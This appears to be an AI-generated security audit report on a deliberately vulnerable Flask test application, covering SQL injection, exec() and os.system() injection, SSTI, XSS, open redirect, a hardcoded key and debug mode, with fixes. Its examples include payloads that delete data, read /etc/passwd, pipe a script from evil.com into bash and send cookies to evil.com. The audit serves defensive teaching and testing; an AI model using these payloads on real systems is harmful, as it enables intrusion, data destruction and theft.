# Security Audit Report: case1_webapp.py

**Audited File:** `D:\code\agent\miko\miko\miko\data\skills\code-audit\evals\files\case1_webapp.py`
**Application Type:** Flask Web Application
**Date:** 2026-06-18
**Severity Legend:** Critical / High / Medium / Low / Info

---

## Executive Summary

This Flask application exhibits **6 Critical-severity vulnerabilities, 1 High-severity vulnerability, 1 Medium-severity vulnerability, and 1 Low-severity issue**. Every endpoint that accepts user input is trivially exploitable. This application is unsafe for deployment in any environment.

---

## Table of Contents

1. [Vulnerability #1: SQL Injection (Critical)](#1-sql-injection-critical)
2. [Vulnerability #2: Arbitrary Code Execution via `exec()` (Critical)](#2-arbitrary-code-execution-via-exec-critical)
3. [Vulnerability #3: Command Injection via `os.system()` (Critical)](#3-command-injection-via-ossystem-critical)
4. [Vulnerability #4: Server-Side Template Injection (Critical)](#4-server-side-template-injection-critical)
5. [Vulnerability #5: Reflected XSS (Medium)](#5-reflected-xss-medium)
6. [Vulnerability #6: Open Redirect (Medium)](#6-open-redirect-medium)
7. [Vulnerability #7: Hardcoded Secret Key (High)](#7-hardcoded-secret-key-high)
8. [Vulnerability #8: Debug Mode Enabled on 0.0.0.0 (Critical)](#8-debug-mode-enabled-on-0000-critical)
9. [Issue #9: Missing Security Headers (Low)](#9-missing-security-headers-low)

---

## Detailed Findings

### 1. SQL Injection (Critical)

**Severity:** Critical
**Location:** `/search` endpoint, line 30
**CWE:** CWE-89

**Vulnerable Code:**
```python
username = request.args.get('q', '')
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
```

**Explanation:**
User-supplied input is concatenated directly into a SQL query string using Python f-strings. An attacker can inject arbitrary SQL by supplying a crafted `q` parameter. Example exploits:

- `?q=' OR '1'='1` -- returns all rows in the table
- `?q='; DROP TABLE users; --` -- destroys the users table
- `?q=' UNION SELECT 1,2,3,4,5 FROM sqlite_master --` -- exfiltrates schema information

**Remediation:**
Use parameterized queries (the proper method from the sqlite3 docs):
```python
username = request.args.get('q', '')
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
```

---

### 2. Arbitrary Code Execution via `exec()` (Critical)

**Severity:** Critical
**Location:** `/admin/exec` endpoint, lines 54-58
**CWE:** CWE-95

**Vulnerable Code:**
```python
@app.route('/admin/exec')
def admin_exec():
    code = request.args.get('code', '')
    exec(code)
    return 'OK'
```

**Explanation:**
The `exec()` built-in executes arbitrary Python code supplied by the user via query string. This is essentially a remote code execution backdoor. An attacker can:
- Read any file on the filesystem: `?code=__import__('os').system('cat /etc/passwd')`
- Execute arbitrary system commands: `?code=__import__('os').system('rm -rf /')`
- Modify application state, exfiltrate data, pivot into the network

**Remediation:**
Remove this endpoint entirely. Under no circumstances should `exec()` be exposed to user input.

---

### 3. Command Injection via `os.system()` (Critical)

**Severity:** Critical
**Location:** `/export` endpoint, lines 46-51
**CWE:** CWE-78

**Vulnerable Code:**
```python
@app.route('/export')
def export_data():
    filename = request.args.get('file', 'export.csv')
    cmd = f'cat /tmp/{filename}'
    os.system(cmd)
    return 'Export complete'
```

**Explanation:**
User-supplied filename is concatenated directly into a shell command. An attacker can chain arbitrary shell commands. Example attacks:
- `?file=export.csv; id` -- executes `cat /tmp/export.csv; id`
- `?file=export.csv; curl http://evil.com/shell.sh | bash` -- downloads and executes a remote script
- `?file=$(rm -rf /tmp/*)` -- command substitution to delete files
- `?file=../../etc/passwd` -- path traversal to read sensitive files

**Remediation:**
Use `subprocess.run()` with argument lists (not shell strings), or better yet, use Python's built-in file I/O:
```python
import subprocess
safe_name = os.path.basename(filename)  # basic sanitization
subprocess.run(['cat', f'/tmp/{safe_name}'], shell=False)
# Or just:
with open(f'/tmp/{safe_name}', 'r') as f:
    content = f.read()
```

---

### 4. Server-Side Template Injection (SSTI) (Critical)

**Severity:** Critical
**Location:** `/user/<name>` endpoint, lines 40-43
**CWE:** CWE-1336

**Vulnerable Code:**
```python
@app.route('/user/<name>')
def user_profile(name):
    template = f'<h1>Profile of {name}</h1><p>Email: {name}@example.com</p>'
    return render_template_string(template)
```

**Explanation:**
User-controlled input (`name` from the URL path) is concatenated into a Jinja2 template string and then rendered directly with `render_template_string()`. Jinja2 template engine allows code execution through template syntax. An attacker can achieve **full Remote Code Execution**:

- `{{ config }}` -- leaks Flask configuration including SECRET_KEY
- `{{ ''.__class__.__mro__[2].__subclasses__() }}` -- explores Python class hierarchy
- `{{ request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read() }}` -- executes arbitrary OS commands

**Remediation:**
Do not pass user input to `render_template_string()`. Use a pre-defined template file with placeholders:
```python
@app.route('/user/<name>')
def user_profile(name):
    return render_template('profile.html', name=name)
```
Where `profile.html` is:
```jinja2
<h1>Profile of {{ name }}</h1><p>Email: {{ name }}@example.com</p>
```
In this case, `{{ name }}` is rendered as a Jinja2 variable, not evaluated as template code.

---

### 5. Reflected XSS (Medium)

**Severity:** Medium
**Location:** `/search` endpoint, lines 35-36
**CWE:** CWE-79

**Vulnerable Code:**
```python
for row in results:
    html += f'<p>{row[0]}: {row[1]}</p>'
```

**Explanation:**
Database values are inserted directly into HTML without any escaping. If an attacker manages to insert malicious data into the database (e.g., via the SQL injection vulnerability), any user visiting the search page would have arbitrary JavaScript executed in their browser. Example payload in a database record: `<script>fetch('http://evil.com/steal?c='+document.cookie)</script>`.

**Remediation:**
Use Jinja2 templates with auto-escaping, or explicitly escape output:
```python
import html as html_module
html_content += f'<p>{html_module.escape(row[0])}: {html_module.escape(row[1])}</p>'
```

---

### 6. Open Redirect (Medium)

**Severity:** Medium
**Location:** `/redirect` endpoint, lines 61-64
**CWE:** CWE-601

**Vulnerable Code:**
```python
@app.route('/redirect')
def do_redirect():
    target = request.args.get('to', '/')
    return redirect(target)
```

**Explanation:**
The `redirect()` call accepts an arbitrary URL from the query string. An attacker can craft a link like:
```
/redirect?to=https://evil-phishing-site.com/login
```
This would silently redirect users to a malicious site that impersonates the legitimate application, enabling phishing attacks or credential theft.

**Remediation:**
Validate that the redirect target is a relative or same-origin URL:
```python
from urllib.parse import urlparse, urljoin

@app.route('/redirect')
def do_redirect():
    target = request.args.get('to', '/')
    # Reject full URLs to external sites
    if urlparse(target).netloc:
        return redirect('/')
    return redirect(target)
```
Or maintain a whitelist of allowed redirect destinations.

---

### 7. Hardcoded Secret Key (High)

**Severity:** High
**Location:** Line 9
**CWE:** CWE-798

**Vulnerable Code:**
```python
app.config['SECRET_KEY'] = 'my-secret-key-123456'
```

**Explanation:**
The Flask secret key is hardcoded in the source code. This key is used for:
- Signing session cookies (allowing session forgery if the key is known)
- CSRF token generation (in Flask-WTF)
- Other cryptographic operations within Flask

Anyone with access to the source code (including public repositories if committed) can forge valid session cookies and impersonate any user.

**Remediation:**
Use an environment variable or a secure secret manager:
```python
import os
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY') or os.urandom(24)
```
Ensure the environment variable value is a strong, randomly generated string (e.g., `python -c "import secrets; print(secrets.token_hex(32))"`).

---

### 8. Debug Mode Enabled on 0.0.0.0 (Critical)

**Severity:** Critical
**Location:** Line 68
**CWE:** CWE-489

**Vulnerable Code:**
```python
app.run(debug=True, host='0.0.0.0')
```

**Explanation:**
This is a compound issue:

1. **`debug=True`**: The Flask debugger includes an interactive Python console accessible via the `/console` endpoint. This console is a full Python REPL -- anyone who can reach it can execute arbitrary code on the server. The Werkzeug debugger also prints detailed tracebacks to the browser, leaking source code, configuration, and internal paths.

2. **`host='0.0.0.0'`**: Binds to all network interfaces, making the application accessible from any network (including the public internet if not firewalled). Combined with `debug=True`, this exposes the interactive debugger to the world.

3. **Combined with the `exec()` and `os.system()` endpoints**, the debug console provides yet another layer of code execution that is often easier to exploit (a nice web UI and tab completion for the attacker).

**Remediation:**
```python
if __name__ == '__main__':
    app.run(debug=False, host='127.0.0.1')
```
- Disable debug mode in production.
- Bind only to localhost unless a reverse proxy is configured.
- Use a production-grade WSGI server (Gunicorn, uWSGI, Waitress) instead of Flask's built-in development server.

---

### 9. Missing Security Headers (Low)

**Severity:** Low
**Location:** Entire application

**Explanation:**
The application sets no security-related HTTP response headers:
- No `Content-Security-Policy` to prevent XSS and data injection
- No `X-Content-Type-Options: nosniff`
- No `X-Frame-Options` to prevent clickjacking
- No `Strict-Transport-Security` (HSTS)

**Remediation:**
Configure these headers, e.g., using the `flask-talisman` extension:
```python
from flask_talisman import Talisman
Talisman(app, content_security_policy={...})
```

---

## Vulnerability Summary Table

| # | Vulnerability | Severity | CWE | Endpoint/Location |
|---|--------------|----------|-----|-------------------|
| 1 | SQL Injection | Critical | CWE-89 | `/search`, line 30 |
| 2 | Arbitrary Code Execution via `exec()` | Critical | CWE-95 | `/admin/exec`, lines 54-58 |
| 3 | Command Injection via `os.system()` | Critical | CWE-78 | `/export`, lines 46-51 |
| 4 | Server-Side Template Injection (SSTI) | Critical | CWE-1336 | `/user/<name>`, line 42 |
| 5 | Reflected / Stored XSS | Medium | CWE-79 | `/search`, line 36 |
| 6 | Open Redirect | Medium | CWE-601 | `/redirect`, lines 61-64 |
| 7 | Hardcoded Secret Key | High | CWE-798 | Line 9 |
| 8 | Debug Mode on 0.0.0.0 | Critical | CWE-489 | Line 68 |
| 9 | Missing Security Headers | Low | CWE-693 | Global |

---

## Attack Chain Analysis

The most dangerous combination in this application is:

1. **Unprotected debug console** (`debug=True` on `0.0.0.0`) provides an interactive Python shell at `/console`.
2. **`exec()` endpoint** (`/admin/exec`) accepts arbitrary Python code with zero authentication.
3. **`os.system()` endpoint** (`/export`) executes arbitrary shell commands.
4. **SSTI** (`/user/<name>`) achieves RCE via Jinja2 template engine.
5. **SQL injection** (`/search`) exposes and corrupts all data.

An attacker can achieve **full server compromise** through any of at least five independent code paths.

---

## Recommendations

1. **Remove the `/admin/exec` endpoint entirely.** It has no legitimate use case and is a direct RCE backdoor.
2. **Rewrite `/export` to use Python file I/O** instead of shell commands.
3. **Use parameterized SQL queries** throughout.
4. **Use Jinja2 template files (.html)** instead of `render_template_string()` with user input.
5. **Move SECRET_KEY to an environment variable** with a strong random value.
6. **Disable debug mode** and do not bind to `0.0.0.0` in any environment.
7. **Validate redirect targets** to only allow same-origin redirects.
8. **Escape HTML output** or use Jinja2 auto-escaping.
9. **Add security headers** (CSP, HSTS, X-Frame-Options, X-Content-Type-Options).
10. **Run a SAST tool** (e.g., Bandit, Semgrep) in CI/CD to catch these patterns before deployment.
